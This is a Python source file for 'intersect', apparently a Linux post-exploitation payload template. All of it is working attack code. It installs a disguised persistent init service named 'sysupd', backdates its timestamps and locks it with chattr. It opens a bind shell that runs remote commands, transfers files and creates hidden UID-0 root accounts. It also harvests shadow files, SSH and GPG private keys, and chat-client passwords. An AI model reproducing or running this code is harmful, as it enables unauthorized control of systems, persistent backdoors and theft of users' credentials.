#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
	option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
         pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['persistent', 'bshell', 'creds']
    PORT = 4444
    RHOST = ''
    RPORT = 8888
    PPORT = 8080
    PKEY = 'KXYRTUX'
# Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
def persistent():
	header = " => "
	print("Select option: ")
	print("1. Add new service")
	print("2. Remove existing persistence")
	option = raw_input("%s " % (header))

	if option == '1':
		addpersist()
	elif option == '2':
		if os.path.exists("/etc/init.d/sysupd") is True:
			print("[+] Removing Intersect persistence...")
			if whereis('chattr') is not None:
				os.system("chattr -i /etc/init.d/sysupd")
				os.system("chattr -i /etc/default/sysupd")
			os.system("rm /etc/init.d/sysupd")
			os.system("update-rc.d sysupd remove")
			os.system("rm /etc/default/sysupd")
			print("[+] Persistent shell successfully removed!")
	else:
		print("[!] Invalid option! Enter '1' or '2'")

	
def addpersist():
	header = " => "
	print("Full path of your Intersect script: ")
	currentfile = raw_input("%s " % (header))

	if os.path.exists(currentfile) is True:
		shutil.copy2(currentfile, "/etc/default/sysupd")
	else:
		print("[!] Incorrect file path, Try again!")
		persistent()


	print("Specify which shell to use: ")
	shell = raw_input("%s " % (header))

	if shell in modList is False:
		print("[!] Shell module not loaded!")
		persistent()
	else:
		if os.path.isdir("/etc/init.d"):
			serwrite = open("/etc/init.d/sysupd", "w")
			serwrite.write("#!/bin/sh\ncd /etc/default/\npython sysupd --%s &" % shell)
			serwrite.close()
			os.system("chmod +x /etc/init.d/sysupd")
			os.system("update-rc.d sysupd defaults")
			print("[+] Persistent service installed.")
			print("[+] Modifying accessed and modified times on shell files...")
            		copystat = os.stat('/etc/init.d/rcS')
			os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
			os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
			print("[+] Attempting to lock down shell files...")
			if whereis('chattr') is not None:
				status = os.system("chattr +i /etc/default/sysupd")
                		if status & 0xff00:
					print("[!] Chattr exited with non-zero status. Could not lock files.")
				status = os.system("chattr +i /etc/init.d/sysupd")
                		if status & 0xff00:
                		    print("[!] Chattr exited with non-zero status. Could not lock files.")
			else:
                		print("[!] Chattr not found. Could not lock files.")

			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")





# Starts a TCP bind shell on the remote system. Offers you the ability to run Intersect tasks via the remote shell.
def bshell():
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        conn, addr = server.accept()
        conn.send("\nIntersect "+str(os.getcwd())+" => ")
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")

        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.") 

        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")

        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")

        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")

	elif cmd == ("extask"):
            conn.send(str(modList))
	    conn.send("\nIntersect "+str(os.getcwd())+" => ")

	elif cmd.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send("[!] Module not loaded!")
            else:
		conn.send("[+] Executing %s " % modname)
                execmod = modname+"()"
                execmod

        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)

        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" => ")


# Gathers user and system credentials and passwords from the remote host. We look for things like crypto keys, ssh keys, shadow files, app credentials, etc.
def creds():
    print("[+] Collecting user and system credentials....")
    os.mkdir(Temp_Dir+"/credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    content = ''
    for f in sshfiles:
       content = content + '\n' + open(f).read()
    open('SSH_Locations.txt','wb').write(content)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
    	if os.path.exists(x) is True:
    		shutil.copy2(x, Temp_Dir+"/credentials/")

    users = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
             users.append(fields[0])

    if whereis('pidgin') is not None:
        for user in users:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in users:
        if os.path.exists("/home/"+user+"/.znc/configs/znc.conf") is True:
            shutil.copy2("/home/"+user+"/.znc/configs/znc.conf", "znc.conf")
        else:
            pass           
            



def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('     -p   --persistent')
    print('     -b   --bshell')
    print('     -c   --creds')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'pbc', ['persistent', 'bshell', 'creds', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-p', '--persistent'):
            persistent()
        elif o in ('-b', '--bshell'):
            bshell()
        elif o in ('-c', '--creds'):
            creds()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])